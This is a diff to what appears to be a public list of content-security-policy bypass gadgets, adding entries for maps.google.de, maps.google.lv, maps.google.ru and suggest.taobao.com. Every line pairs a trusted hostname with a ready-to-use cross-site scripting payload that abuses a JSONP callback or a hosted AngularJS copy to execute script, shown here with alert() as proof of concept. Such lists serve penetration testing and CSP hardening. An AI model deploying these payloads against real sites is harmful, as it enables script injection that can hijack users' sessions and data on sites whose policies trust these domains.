@@ -94,6 +94,9 @@ m.media-amazon.com	<body ng-app ng-csp><script src="https://m.media-amazon.com/i
 mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>
 maps-api-ssl.google.com	<script src="https://maps-api-ssl.google.com/maps/api/js?callback=alert(1337)"></script>
 maps.google.com	<script src="https://maps.google.com/maps/api/js?sensor=false&callback=alert(1)"></script>
+maps.google.de	<script src="https://maps.google.de/maps/api/js?sensor=false&callback=alert(1)"></script>
+maps.google.lv	<script src="https://maps.google.lv/maps/api/js?sensor=false&callback=alert(1)"></script>
+maps.google.ru	<script src="https://maps.google.ru/maps/api/js?sensor=false&callback=alert(1)"></script>
 maps.googleapis.com	<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>
 mc.yandex.ru	<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>
 nominatim.openstreetmap.org	<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>
@@ -128,6 +131,7 @@ ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_j
 st3.zoom.us	<script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 static.parastorage.com	<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 storage.googleapis.com	<script src="https://storage.googleapis.com/bypass_csp/xss.js"></script>
+suggest.taobao.com	<script src="https://suggest.taobao.com/sug?callback=alert"></script>
 suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>
 support.zendesk.com	<script src=https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//></script>
 sync.im-apps.net	<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>
